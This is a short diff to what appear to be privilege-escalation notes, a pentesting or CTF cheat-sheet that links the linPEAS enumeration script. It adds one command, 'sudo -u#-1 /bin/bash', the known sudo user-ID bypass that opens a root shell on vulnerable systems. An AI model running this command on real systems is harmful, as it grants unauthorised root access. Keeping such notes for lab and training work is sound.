@@ -1,3 +1,6 @@
+sudo -u#-1 /bin/bash
+
+----------------------------------------
 
 # priv esc enumeration scripts
 https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
